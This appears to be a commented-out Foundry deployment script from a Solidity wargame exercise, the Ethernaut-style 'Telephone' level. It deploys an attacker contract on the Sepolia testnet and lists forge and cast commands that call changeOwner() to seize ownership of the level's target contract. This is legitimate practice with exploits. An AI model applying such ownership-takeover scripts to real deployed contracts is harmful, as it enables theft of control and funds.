// // SPDX-License-Identifier: MIT

// pragma solidity >=0.8.24;

// import {Script} from "forge-std/Script.sol";
// import {TelephoneAttacker} from "./attacker.sol";
// import {console} from "forge-std/Test.sol";

// contract Attacker is Script {
//     address public target = 0xc44d190689b311Bfe30B1Beb0FFf366E3A7be84b;
//     string SEPOLIA_RPC = "wss://sepolia.drpc.org";
//     uint256 Factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

//     function run() external returns (TelephoneAttacker) {
//         uint256 privateKey = vm.envUint("PRIVATE_KEY");
//         vm.createSelectFork(SEPOLIA_RPC);

//         vm.startBroadcast(privateKey);

//         TelephoneAttacker attacker = new TelephoneAttacker(target);
//         console.log("Attacker contract deployed at:", address(attacker));
        
//         vm.stopBroadcast();

//         return attacker;
//     }
// }

// // # First, source your .env file
// // source .env

// // To run the script:
// // forge script Level4/attacker.s.sol --broadcast --rpc-url https://1rpc.io/sepolia

// // # Cast send for the contract
// // cast send 0xD4E95E7F8BB321786CD1ecFd6FE7A00548C0665B "changeOwner()" --rpc-url https://1rpc.io/sepolia --private-key $PRIVATE_KEY

// // To check consecutive wins:
// // cast call 0xfA2dD651a41da693E6e53a002f6A04466c5c6793 "changeOwner()" --rpc-url wss://sepolia.drpc.org


// //$ forge script Level4/attacker.s.sol --broadcast --rpc-url https://1rpc.io/sepolia --verify
